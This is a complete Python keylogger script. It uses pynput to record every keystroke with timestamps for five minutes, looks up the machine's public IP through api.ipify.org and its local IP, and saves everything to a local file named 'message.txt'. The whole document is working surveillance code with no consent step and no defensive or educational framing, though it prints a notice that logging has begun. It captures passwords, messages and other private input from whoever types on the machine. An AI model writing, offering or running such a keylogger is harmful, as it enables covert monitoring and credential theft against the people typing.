from pynput import keyboard
from datetime import datetime, timedelta
import threading
import requests
import socket

# File to save everything
filename = "message.txt"
end_time = datetime.now() + timedelta(minutes=5)
log = []

# Get public IP
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except requests.RequestException:
        return "Could not retrieve public IP"

# Get local IP
def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except socket.error:
        return "Could not retrieve local IP"

# Add IP info to log
log.append(f"📡 Public IP: {get_public_ip()}\n")
log.append(f"🏠 Local IP: {get_local_ip()}\n")
log.append(f"🕒 Session Start: {datetime.now()}\n\n")

# Key press handler
def on_press(key):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
    try:
        log.append(f"{timestamp}{key.char}\n")
    except AttributeError:
        if key == keyboard.Key.space:
            log.append(f"{timestamp}[SPACE]\n")
        elif key == keyboard.Key.enter:
            log.append(f"{timestamp}[ENTER]\n")
        else:
            log.append(f"{timestamp}[{key.name.upper()}]\n")

    if datetime.now() >= end_time:
        return False

# Save log to file
def save_log():
    with open(filename, "w", encoding="utf-8") as f:
        f.write("".join(log))

# Start listener
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Stop + save after 5 min
threading.Timer(300, lambda: (listener.stop(), save_log())).start()

print(f"⏳ Logging started. Keystrokes and IP info will be saved to '{filename}' for 5 minutes.")
